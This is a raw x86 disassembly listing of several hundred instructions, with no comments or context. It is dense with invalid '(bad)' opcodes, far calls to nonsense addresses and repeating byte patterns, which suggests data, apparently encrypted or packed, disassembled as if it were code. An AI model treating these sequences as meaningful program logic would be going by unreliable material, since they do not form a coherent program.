  431d0f:	call   0x13507ebc
  431d14:	mov    dh,0x63
  431d16:	bound  esp,QWORD PTR [edx-0x6d]
  431d19:	mov    edx,0x9ee20d60
  431d1e:	arpl   WORD PTR [edx+0x62],sp
  431d21:	or     eax,0x626372e4
  431d26:	bound  ebx,QWORD PTR [edx]
  431d28:	xchg   BYTE PTR [eax-0x1df265fc],dl
  431d2e:	retf   0x6263
  431d31:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431d37:	xor    al,0x5e
  431d39:	call   0x13507ee6
  431d3e:	mov    dh,0x63
  431d40:	bound  esp,QWORD PTR [edx-0x6d]
  431d43:	mov    edx,0xd2e20d60
  431d48:	arpl   WORD PTR [edx+0x62],sp
  431d4b:	test   DWORD PTR [ebx],ecx
  431d4d:	call   0x6372:0xe2563ac9
  431d54:	bound  esp,QWORD PTR [edx-0x6d]
  431d57:	push   es
  431d58:	outs   dx,BYTE PTR ds:[esi]
  431d59:	call   0x130d:0x61a8e85e
  431d60:	fisub  DWORD PTR [ebx+0x62]
  431d63:	(bad)  
  431d64:	(bad)  
  431d65:	outs   dx,DWORD PTR ds:[esi]
  431d66:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  431d6c:	call   0x693:0x61a8e85e
  431d73:	adc    esp,DWORD PTR [edi-0x509d9d9d]
  431d79:	pusha  
  431d7a:	add    al,0x13
  431d7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431d7d:	arpl   WORD PTR [edx+0x62],sp
  431d80:	sbb    ah,dl
  431d82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431d83:	arpl   WORD PTR [edx+0x62],sp
  431d86:	or     eax,0x6263ca13
  431d8b:	(bad)  
  431d8c:	(bad)  
  431d8d:	outs   dx,DWORD PTR ds:[esi]
  431d8e:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431d94:	pop    esi
  431d95:	call   0xe4507f42
  431d9a:	mov    dh,0x63
  431d9c:	bound  esp,QWORD PTR [edx-0x6d]
  431d9f:	mov    edx,0x72130d4f
  431da4:	arpl   WORD PTR [edx+0x62],sp
  431da7:	add    al,0xf7
  431da9:	mov    DWORD PTR ds:0x6263cae2,ecx
  431daf:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431db5:	xor    al,0x5e
  431db7:	call   0x13507f64
  431dbc:	mov    dh,0x63
  431dbe:	bound  esp,QWORD PTR [edx-0x6d]
  431dc1:	mov    edx,0x9ee20d60
  431dc6:	arpl   WORD PTR [edx+0x62],sp
  431dc9:	or     eax,0x626372e4
  431dce:	bound  ebx,QWORD PTR [edx]
  431dd0:	xchg   BYTE PTR [eax-0x1df265fc],dl
  431dd6:	retf   0x6263
  431dd9:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431ddf:	xor    al,0x5e
  431de1:	call   0x13507f8e
  431de6:	mov    dh,0x63
  431de8:	bound  esp,QWORD PTR [edx-0x6d]
  431deb:	mov    edx,0x96e20d60
  431df0:	arpl   WORD PTR [edx+0x62],sp
  431df3:	test   DWORD PTR [ebx],ecx
  431df5:	call   0x6372:0xe2563ac9
  431dfc:	bound  esp,QWORD PTR [edx-0x6d]
  431dff:	push   es
  431e00:	outs   dx,BYTE PTR ds:[esi]
  431e01:	call   0x130d:0x61a8e85e
  431e08:	inc    eax
  431e09:	arpl   WORD PTR [edx+0x62],sp
  431e0c:	(bad)  
  431e0d:	outs   dx,DWORD PTR ds:[esi]
  431e0e:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  431e14:	call   0x693:0x61a8e85e
  431e1b:	adc    esp,DWORD PTR [edi-0x509d9d9d]
  431e21:	pusha  
  431e22:	add    al,0x13
  431e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431e25:	arpl   WORD PTR [edx+0x62],sp
  431e28:	sbb    ah,dl
  431e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431e2b:	arpl   WORD PTR [edx+0x62],sp
  431e2e:	or     eax,0x6263ca13
  431e33:	(bad)  
  431e34:	(bad)  
  431e35:	outs   dx,DWORD PTR ds:[esi]
  431e36:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431e3c:	pop    esi
  431e3d:	call   0xe4507fea
  431e42:	mov    dh,0x63
  431e44:	bound  esp,QWORD PTR [edx-0x6d]
  431e47:	mov    edx,0x72130d4f
  431e4c:	arpl   WORD PTR [edx+0x62],sp
  431e4f:	add    al,0xf7
  431e51:	mov    DWORD PTR ds:0x626396e2,ecx
  431e57:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431e5d:	xor    al,0x5e
  431e5f:	call   0x1350800c
  431e64:	mov    esi,0xd6626263
  431e69:	outs   dx,DWORD PTR ds:[esi]
  431e6a:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431e70:	pop    esi
  431e71:	call   0xbad6801e
  431e76:	pop    ds
  431e77:	push   esi
  431e78:	loop   0x431e30
  431e7a:	arpl   WORD PTR [edx+0x62],sp
  431e7d:	pop    ss
  431e7e:	loop   0x431e36
  431e80:	arpl   WORD PTR [edx+0x62],sp
  431e83:	lock sub al,0x63
  431e86:	bound  esp,QWORD PTR [edx+0xd]
  431e89:	loop   0x431e71
  431e8b:	arpl   WORD PTR [edx+0x62],sp
  431e8e:	test   DWORD PTR [ebx],ecx
  431e90:	call   0x632c:0x130d3ac9
  431e97:	bound  esp,QWORD PTR [edx-0x2a]
  431e9a:	outs   dx,DWORD PTR ds:[esi]
  431e9b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431ea1:	pop    esi
  431ea2:	call   0xe450804f
  431ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431ea8:	arpl   WORD PTR [edx+0x62],sp
  431eab:	or     eax,0x6263960b
  431eb0:	(bad)  
  431eb1:	(bad)  
  431eb2:	dec    ebx
  431eb3:	or     ebx,DWORD PTR [edx-0x29c537]
  431eb9:	pop    esi
  431eba:	call   0xbad68067
  431ebf:	xchg   di,ax
  431ec1:	outs   dx,DWORD PTR ds:[esi]
  431ec2:	adc    ebp,DWORD PTR [esi+0x3b]
  431ec5:	pop    esi
  431ec6:	call   0x13508073
  431ecb:	out    0x63,al
  431ecd:	bound  esp,QWORD PTR [edx-0x2a]
  431ed0:	outs   dx,DWORD PTR ds:[esi]
  431ed1:	or     ebx,DWORD PTR [edx+0x13563ac9]
  431ed7:	fbld   TBYTE PTR [ebx+0x62]
  431eda:	bound  edx,QWORD PTR [ebx]
  431edc:	outs   dx,BYTE PTR ds:[esi]
  431edd:	push   0x61a8e85e
  431ee2:	pop    ss
  431ee3:	loop   0x431ec4
  431ee5:	arpl   WORD PTR [edx+0x62],sp
  431ee8:	out    dx,al
  431ee9:	jl     0x431ef8
  431eeb:	loop   0x431ed3
  431eed:	arpl   WORD PTR [edx+0x62],sp
  431ef0:	test   DWORD PTR [ebx],ecx
  431ef2:	call   0x63df:0x130d3ac9
  431ef9:	bound  esp,QWORD PTR [edx+0x13]
  431efc:	outs   dx,BYTE PTR ds:[esi]
  431efd:	push   0x61a8e85e
  431f02:	pop    ss
  431f03:	loop   0x431ee4
  431f05:	arpl   WORD PTR [edx+0x62],sp
  431f08:	lock jno 0x431f60
  431f0b:	bound  esp,QWORD PTR [edx+0xd]
  431f0e:	loop   0x431f8a
  431f10:	bound  esp,QWORD PTR [edx+0x62]
  431f13:	test   DWORD PTR [ebx],ecx
  431f15:	call   0xa8e8:0x5e343ac9
  431f1c:	popa   
  431f1d:	pop    ss
  431f1e:	loop   0x431f6c
  431f20:	arpl   WORD PTR [edx+0x62],sp
  431f23:	bound  esi,QWORD PTR [edx-0x31f49da3]
  431f29:	bound  esp,QWORD PTR [edx+0x62]
  431f2c:	repz mov esi,0x17616175
  431f32:	loop   0x431f80
  431f34:	arpl   WORD PTR [edx+0x62],sp
  431f37:	or     eax,0xb85ad75
  431f3c:	call   0xa8e8:0x5e343ac9
  431f43:	popa   
  431f44:	ror    BYTE PTR ds:0x6262e6e2,cl
  431f4a:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431f50:	xor    al,0x5e
  431f52:	call   0x631580ff
  431f57:	or     ecx,DWORD PTR [ebx+eiz*2+0x62]
  431f5b:	bound  ecx,QWORD PTR ds:0x62627ae2
  431f61:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431f67:	xor    al,0x5e
  431f69:	call   0xe158116
  431f6e:	jne    0x431f94
  431f70:	or     eax,0x616848db
  431f75:	popa   
  431f76:	(bad)  {k7}
  431f7b:	adc    al,0x63
  431f7d:	bound  esp,QWORD PTR [edx+0xd]
  431f80:	loop   0x431ffc
  431f82:	bound  esp,QWORD PTR [edx+0x62]
  431f85:	test   DWORD PTR [ebx],ecx
  431f87:	call   0xa8e8:0x5e343ac9
  431f8e:	popa   
  431f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431f90:	loop   0x431fa6
  431f92:	arpl   WORD PTR [edx+0x62],sp
  431f95:	out    0x40,eax
  431f97:	bound  ecx,QWORD PTR [ebx]
  431f99:	dec    esp
  431f9a:	arpl   WORD PTR [edx+0x62],sp
  431f9d:	bound  ecx,QWORD PTR [ebx]
  431f9f:	adc    al,0x63
  431fa1:	bound  esp,QWORD PTR [edx+0x62]
  431fa4:	mov    dl,0x5d
  431fa6:	bound  ecx,QWORD PTR [ebx]
  431fa8:	into   
  431fa9:	bound  esp,QWORD PTR [edx+0x62]
  431fac:	repz jle 0x431f48
  431faf:	popa   
  431fb0:	popa   
  431fb1:	or     eax,0xb851c75
  431fb6:	call   0xa8e8:0x5e343ac9
  431fbd:	popa   
  431fbe:	ror    BYTE PTR ds:0x62627ae2,cl
  431fc4:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431fca:	xor    al,0x5e
  431fcc:	call   0x63158179
  431fd1:	or     ecx,esi
  431fd3:	bound  esp,QWORD PTR [edx+0x62]
  431fd6:	or     eax,0xdb0d2475
  431fdb:	dec    eax
  431fdc:	push   0xd2626161
  431fe1:	mov    cl,BYTE PTR ds:0x626314e2
  431fe7:	bound  edx,QWORD PTR [edi]
  431fe9:	loop   0x431fb9
  431feb:	bound  esp,QWORD PTR [edx+0x62]
  431fee:	or     eax,0x62634ce2
  431ff3:	bound  edx,QWORD PTR [edi]
  431ff5:	jne    0x432054
  431ff7:	or     eax,0x6262cee2
  431ffc:	bound  edx,QWORD PTR [edi]
  431ffe:	loop   0x432020
  432000:	arpl   WORD PTR [edx+0x62],sp
  432003:	or     eax,0x626240e2
  432008:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43200e:	xor    al,0x5e
  432010:	call   0xe25a81bd
  432015:	sbb    al,0x63
  432017:	bound  esp,QWORD PTR [edx-0x1]
  43201a:	loop   0x432015
  43201c:	arpl   WORD PTR [edx+0x62],sp
  43201f:	inc    ebp
  432020:	jmp    edx
  432022:	hlt    
  432023:	arpl   WORD PTR [edx+0x62],sp
  432026:	dec    ebp
  432027:	jmp    edx
  432029:	jmp    DWORD PTR [ebx+0x62]
  43202c:	bound  eax,QWORD PTR [ebp-0x1]
  43202f:	loop   0x432052
  432031:	arpl   WORD PTR [edx+0x62],sp
  432034:	sub    bh,bh
  432036:	loop   0x432098
  432038:	arpl   WORD PTR [edx+0x62],sp
  43203b:	inc    ebp
  43203c:	jmp    edx
  43203e:	push   edi
  43203f:	arpl   WORD PTR [edx+0x62],sp
  432042:	adc    al,0xff
  432044:	loop   0x432094
  432046:	arpl   WORD PTR [edx+0x62],sp
  432049:	inc    ebp
  43204a:	jmp    edx
  43204c:	dec    ebp
  43204d:	arpl   WORD PTR [edx+0x62],sp
  432050:	sbb    al,0xd
  432052:	loop   0x4320ce
  432054:	bound  esp,QWORD PTR [edx+0x62]
  432057:	pop    ss
  432058:	loop   0x432007
  43205a:	arpl   WORD PTR [edx+0x62],sp
  43205d:	out    dx,al
  43205e:	aaa    
  43205f:	or     eax,0x6263ade2
  432064:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43206a:	or     eax,0x62624013
  43206f:	(bad)  
  432070:	(bad)  
  432071:	outs   dx,DWORD PTR ds:[esi]
  432072:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432078:	call   0xb85:0x61a8e85e
  43207f:	call   0x63ad:0xe2173ac9
  432086:	bound  esp,QWORD PTR [edx-0x2a]
  432089:	and    ebp,DWORD PTR [ebp+0x14626263]
  43208f:	loop   0x432092
  432091:	imul   esp,edi,0xade20dc0
  432097:	arpl   WORD PTR [edx+0x62],sp
  43209a:	test   DWORD PTR [ebx],ecx
  43209c:	call   0x6320:0x130d3ac9
  4320a3:	bound  esp,QWORD PTR [edx-0x6d]
  4320a6:	push   ds
  4320a7:	outs   dx,BYTE PTR ds:[esi]
  4320a8:	push   0x61a8e85e
  4320ad:	or     eax,0x6263ad13
  4320b2:	(bad)  
  4320b3:	(bad)  
  4320b4:	outs   dx,DWORD PTR ds:[esi]
  4320b5:	or     ebx,DWORD PTR [edx+0x6933ac9]
  4320bb:	adc    BYTE PTR [ebp+0x61a86d29],cl
  4320c1:	(bad)  
  4320c2:	outs   dx,DWORD PTR ds:[esi]
  4320c3:	fsub   DWORD PTR [ecx+0x61]
  4320c6:	popa   
  4320c7:	fcomp  DWORD PTR [edi]
  4320c9:	call   0xe71f:0xa7570693
  4320d0:	mov    cl,BYTE PTR ds:0x62627ae2
  4320d6:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4320dc:	xor    al,0x5e
  4320de:	call   0xe25a828b
  4320e3:	sbb    al,0x63
  4320e5:	bound  esp,QWORD PTR [edx-0x12]
  4320e8:	xor    al,0xf0
  4320ea:	ins    DWORD PTR es:[edi],dx
  4320eb:	bound  esp,QWORD PTR [edx+0x62]
  4320ee:	or     eax,0x62627ae2
  4320f3:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4320f9:	xor    al,0x5e
  4320fb:	call   0xe2ea82a8
  432100:	sbb    al,0x63
  432102:	bound  esp,QWORD PTR [edx-0x6d]
  432105:	outs   dx,BYTE PTR ds:[esi]
  432106:	fcomp  QWORD PTR [edi+0x61]
  432109:	popa   
  43210a:	or     eax,0x626320e2
  43210f:	bound  ecx,QWORD PTR ds:0xe2179aa2
  432115:	push   esp
  432116:	arpl   WORD PTR [edx+0x62],sp
  432119:	and    edx,esp
  43211b:	outs   dx,BYTE PTR ds:[esi]
  43211c:	arpl   WORD PTR [edx+0x62],sp
  43211f:	lods   eax,DWORD PTR ds:[esi]
  432120:	loop   0x432123
  432122:	imul   esp,DWORD PTR [ecx],0x6263e9e2
  432128:	bound  ebx,QWORD PTR [edi]
  43212a:	adc    eax,0xe2216901
  43212f:	adc    BYTE PTR [ebx+0x62],ah
  432132:	bound  ebp,QWORD PTR [ebp+0x2169010b]
  432138:	loop   0x432137
  43213a:	arpl   WORD PTR [edx+0x62],sp
  43213d:	and    dl,ah
  43213f:	add    DWORD PTR [ecx+0xd],ebp
  432142:	loop   0x432141
  432144:	arpl   WORD PTR [edx+0x62],sp
  432147:	test   DWORD PTR [ebx],ecx
  432149:	call   0xa8e8:0x5e343ac9
  432150:	popa   
  432151:	ror    BYTE PTR ds:0x626310e2,cl
  432157:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43215d:	xor    al,0x5e
  43215f:	call   0xe15830c
  432164:	loop   0x43214f
  432166:	arpl   WORD PTR [edx+0x62],sp
  432169:	test   DWORD PTR [ebx],ecx
  43216b:	call   0xa8e8:0x5e343ac9
  432172:	popa   
  432173:	ror    BYTE PTR ds:0x62636ee2,cl
  432179:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43217f:	xor    al,0x5e
  432181:	call   0xe15832e
  432186:	jne    0x4321ac
  432188:	or     eax,0x616848db
  43218d:	popa   
  43218e:	(bad)  {k7}
  432193:	add    DWORD PTR [ebx+0x62],esp
  432196:	bound  ecx,QWORD PTR ds:0x6263fde2
  43219c:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4321a2:	xor    al,0x5e
  4321a4:	call   0xe158351
  4321a9:	loop   0x4321bb
  4321ab:	arpl   WORD PTR [edx+0x62],sp
  4321ae:	test   DWORD PTR [ebx],ecx
  4321b0:	call   0xa8e8:0x5e343ac9
  4321b7:	popa   
  4321b8:	shl    BYTE PTR [edx+0xb],cl
  4321bb:	push   esp
  4321bc:	arpl   WORD PTR [edx+0x62],sp
  4321bf:	or     eax,0x62636ee2
  4321c4:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4321ca:	xor    al,0x5e
  4321cc:	call   0xe158379
  4321d1:	jne    0x4321f7
  4321d3:	or     eax,0x616848db
  4321d8:	popa   
  4321d9:	(bad)  {k7}
  4321de:	and    al,0x63
  4321e0:	bound  esp,QWORD PTR [edx+0xd]
  4321e3:	loop   0x432253
  4321e5:	arpl   WORD PTR [edx+0x62],sp
  4321e8:	test   DWORD PTR [ebx],ecx
  4321ea:	call   0xa8e8:0x5e343ac9
  4321f1:	popa   
  4321f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4321f3:	loop   0x4321f6
  4321f5:	arpl   WORD PTR [edx+0x62],sp
  4321f8:	out    0x8a,eax
  4321fa:	or     eax,0x62636ee2
  4321ff:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  432205:	xor    al,0x5e
  432207:	call   0xe2ea83b4
  43220c:	and    al,0x63
  43220e:	bound  esp,QWORD PTR [edx-0x4e]
  432211:	xor    al,0xf0
  432213:	mov    WORD PTR [ebx],?
  432215:	popa   
  432216:	popa   
  432217:	and    edx,esp
  432219:	cmc    
  43221a:	arpl   WORD PTR [edx+0x62],sp
  43221d:	and    esp,edx
  43221f:	add    DWORD PTR [ecx+0x21],ebp
  432222:	loop   0x432230
  432224:	arpl   WORD PTR [edx+0x62],sp
  432227:	mov    bl,0xe2
  432229:	add    DWORD PTR [ecx+0xd],ebp
  43222c:	loop   0x432223
  43222e:	arpl   WORD PTR [edx+0x62],sp
  432231:	test   DWORD PTR [ebx],ecx
  432233:	call   0xa8e8:0x5e343ac9
  43223a:	popa   
  43223b:	or     eax,0x62630113
  432240:	bound  eax,QWORD PTR [eax+ebp*2]
  432243:	or     eax,0x62636ee2
  432248:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43224e:	xor    al,0x5e
  432250:	call   0x135083fd
  432255:	add    DWORD PTR [ebx+0x62],esp
  432258:	bound  eax,QWORD PTR [ecx+ebx*4]
  43225b:	push   0x630ce20d
  432260:	bound  esp,QWORD PTR [edx-0x7b]
  432263:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  432269:	call   0x13508416
  43226e:	add    DWORD PTR [ebx+0x62],esp
  432271:	bound  eax,QWORD PTR [ecx+ebx*4]
  432274:	pop    edi
  432275:	fcomp  DWORD PTR [ebx-0x4f]
  432278:	arpl   WORD PTR [edx+0x62],sp
  43227b:	popa   
  43227c:	fcomp  DWORD PTR [ebx-0x25]
  43227f:	arpl   WORD PTR [edx+0x62],sp
  432282:	popa   
  432283:	fcomp  DWORD PTR [ebx+0x4]
  432286:	arpl   WORD PTR [edx+0x62],sp
  432289:	popa   
  43228a:	adc    esp,edx
  43228c:	(bad)  [ebx+0x62]
  43228f:	(bad)  
  432291:	bound  ecx,QWORD PTR [ebx]
  432293:	push   esp
  432294:	arpl   WORD PTR [edx+0x62],sp
  432297:	bound  ecx,QWORD PTR [ebx]
  432299:	and    al,0x63
  43229b:	bound  esp,QWORD PTR [edx+0x13]
  43229e:	loop   0x432251
  4322a0:	arpl   WORD PTR [edx+0x62],sp
  4322a3:	ror    BYTE PTR ds:0x626320e2,cl
  4322a9:	bound  esp,QWORD PTR [edx-0x15]
  4322ac:	xchg   BYTE PTR ds:0x6262cee2,cl
  4322b2:	(bad)  
  4322b3:	fcomp  DWORD PTR [edx+edx*4]
  4322b6:	shl    BYTE PTR [edx+0xb],cl
  4322b9:	add    DWORD PTR [ebx+0x62],esp
  4322bc:	(bad)
  4322c1:	bound  edx,QWORD PTR [edi]
  4322c3:	loop   0x4322c9
  4322c5:	arpl   WORD PTR [edx+0x62],sp
  4322c8:	or     eax,0xb851c75
  4322cd:	call   0xa8e8:0x5e343ac9
  4322d4:	popa   
  4322d5:	ror    BYTE PTR ds:0x62636ee2,cl
  4322db:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4322e1:	xor    al,0x5e
  4322e3:	call   0x63158490
  4322e8:	or     eax,DWORD PTR [ecx]
  4322ea:	arpl   WORD PTR [edx+0x62],sp
  4322ed:	or     eax,0xdb0d2475
  4322f2:	dec    eax
  4322f3:	push   0xd2626161
  4322f8:	mov    cl,BYTE PTR ds:0x626304e2
  4322fe:	bound  esi,QWORD PTR [ebx]
  432300:	pop    esi
  432301:	call   0xbc884ae
  432306:	call   0x1e2:0xad9d3ac9
  43230d:	imul   esi,DWORD PTR [edx+0x1c750dda],0xc99a0b85
  432317:	cmp    dh,BYTE PTR [esi+ebx*2]
  43231a:	call   0xe1584c7
  43231f:	loop   0x43238f
  432321:	arpl   WORD PTR [edx+0x62],sp
  432324:	test   DWORD PTR [ebx],ecx
  432326:	call   0xa8e8:0x5e343ac9
  43232d:	popa   
  43232e:	shl    BYTE PTR [edx+0xb],cl
  432331:	into   
  432332:	bound  esp,QWORD PTR [edx+0x62]
  432335:	or     eax,0xdb0d2475
  43233a:	dec    eax
  43233b:	push   0xd2626161
  432340:	mov    cl,BYTE PTR ds:0x626324e2
  432346:	bound  edx,QWORD PTR [edi]
  432348:	loop   0x432318
  43234a:	bound  esp,QWORD PTR [edx+0x62]
  43234d:	or     eax,0x626354e2
  432352:	bound  edx,QWORD PTR [edi]
  432354:	jne    0x4323b3
  432356:	out    dx,al
  432357:	test   eax,0x851c750d
  43235c:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  432362:	call   0xe15850f
  432367:	loop   0x4323d7
  432369:	arpl   WORD PTR [edx+0x62],sp
  43236c:	test   DWORD PTR [ebx],ecx
  43236e:	call   0xa8e8:0x5e343ac9
  432375:	popa   
  432376:	shl    BYTE PTR [edx+0xb],cl
  432379:	and    al,0x63
  43237b:	bound  esp,QWORD PTR [edx+0xd]
  43237e:	jne    0x4323a4
  432380:	or     eax,0x616848db
  432385:	popa   
  432386:	(bad)  
  432388:	mov    cl,BYTE PTR ds:0xe2175d75
  43238e:	pusha  
  43238f:	pop    esp
  432390:	bound  esp,QWORD PTR [edx+0xd]
  432393:	loop   0x432363
  432395:	bound  esp,QWORD PTR [edx+0x62]
  432398:	pop    ss
  432399:	loop   0x4323e7
  43239b:	pop    esp
  43239c:	bound  esp,QWORD PTR [edx+0x21]
  43239f:	loop   0x43241f
  4323a1:	arpl   WORD PTR [edx+0x62],sp
  4323a4:	lods   eax,DWORD PTR ds:[esi]
  4323a5:	loop   0x4323a8
  4323a7:	imul   esp,DWORD PTR [ecx],0x626392e2
  4323ad:	bound  esp,QWORD PTR ds:0xd6901e2
  4323b3:	loop   0x432433
  4323b5:	arpl   WORD PTR [edx+0x62],sp
  4323b8:	test   DWORD PTR [ebx],ecx
  4323ba:	call   0xa8e8:0x5e343ac9
  4323c1:	popa   
  4323c2:	pop    ss
  4323c3:	loop   0x4323c0
  4323c5:	arpl   WORD PTR [edx+0x62],sp
  4323c8:	or     eax,0x62637ee2
  4323cd:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4323d3:	xor    al,0x5e
  4323d5:	call   0xe25a8582
  4323da:	jbe    0x43243f
  4323dc:	bound  esp,QWORD PTR [edx+0x21]
  4323df:	loop   0x43236b
  4323e1:	arpl   WORD PTR [edx+0x62],sp
  4323e4:	or     al,0xe2
  4323e6:	add    DWORD PTR [ecx+0x21],ebp
  4323e9:	loop   0x432371
  4323eb:	arpl   WORD PTR [edx+0x62],sp
  4323ee:	daa    
  4323ef:	loop   0x4323f2
  4323f1:	imul   ecx,DWORD PTR ds:0x625c60e2,0x7e130d62
  4323fb:	arpl   WORD PTR [edx+0x62],sp
  4323fe:	(bad)  
  4323ff:	outs   dx,DWORD PTR ds:[esi]
  432400:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432406:	pop    esi
  432407:	call   0x1fea85b4
  43240c:	xchg   ebx,eax
  43240d:	outs   dx,BYTE PTR ds:[esi]
  43240e:	add    eax,0xd616156
  432413:	loop   0x4323a7
  432415:	arpl   WORD PTR [edx+0x62],sp
  432418:	test   DWORD PTR [ebx],ecx
  43241a:	call   0xa8e8:0x5e343ac9
  432421:	popa   
  432422:	or     eax,0x6263fb13
  432427:	bound  edx,QWORD PTR [ebx-0x1df29f46]
  43242d:	xchg   edx,eax
  43242e:	arpl   WORD PTR [edx+0x62],sp
  432431:	test   DWORD PTR [ebx],ecx
  432433:	call   0xa8e8:0x5e343ac9
  43243a:	popa   
  43243b:	or     eax,0x625c60e4
  432440:	bound  ebp,QWORD PTR ds:0x934ea758
  432446:	mov    ah,0xc0
  432448:	push   esi
  432449:	popa   
  43244a:	popa   
  43244b:	or     eax,0x625c60e2
  432450:	bound  ecx,QWORD PTR ds:0x6263fb13
  432456:	bound  ebp,QWORD PTR ds:0x8a130d1f
  43245c:	arpl   WORD PTR [edx+0x62],sp
  43245f:	(bad)  
  432460:	outs   dx,DWORD PTR ds:[esi]
  432461:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432467:	pop    esi
  432468:	call   0x46f28615
  43246d:	dec    edx
  43246e:	outs   dx,DWORD PTR ds:[esi]
  43246f:	pop    ss
  432470:	loop   0x43240c
  432472:	arpl   WORD PTR [edx+0x62],sp
  432475:	or     eax,0x62639ae2
  43247a:	bound  ecx,QWORD PTR ds:0x62638613
  432480:	(bad)  
  432481:	(bad)  
  432482:	outs   dx,DWORD PTR ds:[esi]
  432483:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432489:	pop    esi
  43248a:	call   0x1fea8637
  43248f:	lds    ebp,FWORD PTR [edx+0xd]
  432492:	loop   0x43241a
  432494:	arpl   WORD PTR [edx+0x62],sp
  432497:	test   DWORD PTR [ebx],ecx
  432499:	call   0xa8e8:0x5e343ac9
  4324a0:	popa   
  4324a1:	pop    ss
  4324a2:	loop   0x43243e
  4324a4:	arpl   WORD PTR [edx+0x62],sp
  4324a7:	or     eax,0x62638ae2
  4324ac:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4324b2:	xor    al,0x5e
  4324b4:	call   0x13508661
  4324b9:	call   0x60ba:0x93626263
  4324c0:	pop    ss
  4324c1:	adc    esi,DWORD PTR [esi+0x63]
  4324c4:	bound  esp,QWORD PTR [edx+0xd]
  4324c7:	loop   0x43253f
  4324c9:	arpl   WORD PTR [edx+0x62],sp
  4324cc:	or     eax,0x62637e13
  4324d1:	(bad)  
  4324d2:	(bad)  
  4324d3:	outs   dx,DWORD PTR ds:[esi]
  4324d4:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4324da:	pop    esi
  4324db:	call   0x1fea8688
  4324e0:	xchg   ebx,eax
  4324e1:	outs   dx,BYTE PTR ds:[esi]
  4324e2:	add    DWORD PTR [edi+0x61],ebx
  4324e5:	popa   
  4324e6:	or     eax,0x626376e2
  4324eb:	bound  edx,QWORD PTR [edi]
  4324ed:	loop   0x432547
  4324ef:	pop    esp
  4324f0:	bound  esp,QWORD PTR [edx+0xd]
  4324f3:	loop   0x432541
  4324f5:	pop    esp
  4324f6:	bound  esp,QWORD PTR [edx+0x56]
  4324f9:	loop   0x4324f6
  4324fb:	arpl   WORD PTR [edx+0x62],sp
  4324fe:	pop    ss
  4324ff:	loop   0x432529
  432501:	pop    esp
  432502:	bound  esp,QWORD PTR [edx+0x21]
  432505:	loop   0x4324fa
  432507:	pop    esp
  432508:	bound  esp,QWORD PTR [edx-0x53]
  43250b:	loop   0x43250e
  43250d:	imul   esp,DWORD PTR [ecx],0x625c48e2
  432513:	bound  esp,QWORD PTR ds:0x216901e2
  432519:	loop   0x432578
  43251b:	pop    esp
  43251c:	bound  esp,QWORD PTR [edx-0x4d]
  43251f:	loop   0x432522
  432521:	imul   esp,DWORD PTR [ecx],0x625c69e2
  432527:	bound  esp,QWORD PTR [ebx]
  432529:	loop   0x43252c
  43252b:	imul   esp,DWORD PTR [ecx],0x625c55e2
  432531:	bound  esp,QWORD PTR ds:0xd6901e2
  432537:	loop   0x43252c
  432539:	pop    esp
  43253a:	bound  esp,QWORD PTR [edx-0x7b]
  43253d:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  432543:	call   0xe25a86f0
  432548:	popa   
  432549:	arpl   WORD PTR [edx+0x62],sp
  43254c:	adc    esp,edx
  43254e:	fs pop esp
  432550:	bound  esp,QWORD PTR [edx+0x17]
  432553:	loop   0x43256d
  432555:	pop    esp
  432556:	bound  esp,QWORD PTR [edx+0x13]
  432559:	loop   0x432552
  43255b:	arpl   WORD PTR [edx+0x62],sp
  43255e:	pop    ss
  43255f:	loop   0x432592
  432561:	pop    esp
  432562:	bound  esp,QWORD PTR [edx+0xd]
  432565:	loop   0x4325bf
  432567:	pop    esp
  432568:	bound  esp,QWORD PTR [edx-0x59]
  43256b:	loop   0x4325ce
  43256d:	arpl   WORD PTR [edx+0x62],sp
  432570:	xchg   ebx,eax
  432571:	fdivr  DWORD PTR [ebx+0xd616168]
  432577:	loop   0x432591
  432579:	pop    esp
  43257a:	bound  esp,QWORD PTR [edx+0x21]
  43257d:	popa   
  43257e:	pop    ebx
  43257f:	loop   0x432582
  432581:	imul   ecx,DWORD PTR ds:0x625c31e2,0xb7612162
  43258b:	loop   0x43258e
  43258d:	imul   edx,DWORD PTR [ebx],0x625c49e2
  432593:	bound  edx,QWORD PTR [edi]
  432595:	loop   0x4325e7
  432597:	pop    esp
